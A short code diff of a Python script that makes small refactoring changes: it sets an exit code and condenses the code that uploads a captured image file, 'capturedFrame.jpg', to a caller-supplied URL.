@@ -14,17 +14,13 @@ def requestsInitialize():
             import requests
         except Exception as e:
             print(f"Error installing requests: {e}")
-            exit()
+            exit(33)
 
 
 def sendHook(url, payload):
     with open('capturedFrame.jpg', 'rb') as f:
         image_data = f.read()
-
-    files = {
-        'file': ('capturedFrame.jpg', image_data)
-    }
-
+    files = {'file': ('capturedFrame.jpg', image_data)}
     response = requests.post(url, data=payload, files=files)
     if response.status_code == 200:
         print("Image sent successfully")
